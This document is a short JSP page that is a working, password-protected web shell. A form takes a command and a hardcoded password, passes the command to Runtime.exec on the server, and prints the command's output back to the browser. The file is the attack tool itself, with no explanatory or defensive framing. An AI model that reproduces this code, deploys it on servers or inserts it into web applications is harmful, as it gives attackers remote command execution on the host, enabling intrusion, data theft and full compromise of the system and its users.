<%@ page import="java.util.*,java.io.*"%>
<html>
<body>
<form name="myform" action="" method="get">
<input type="text" name="cmd">
<input type="password" name="pw">
<input type="submit" value="send">
</form>
<pre>
<%
if (request.getParameter("cmd") != null && request.getParameter("pw").equals("supersecurepasswordhere")) {
	out.println("Command: " + request.getParameter("cmd") + "<br>");
	Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	OutputStream os = p.getOutputStream();
	InputStream in = p.getInputStream();
	DataInputStream dis = new DataInputStream(in);
	String disr = dis.readLine();
	while (disr != null) {
		out.println(disr);
		disr = dis.readLine();
	}
}
%>
</pre>
</body>
</html>
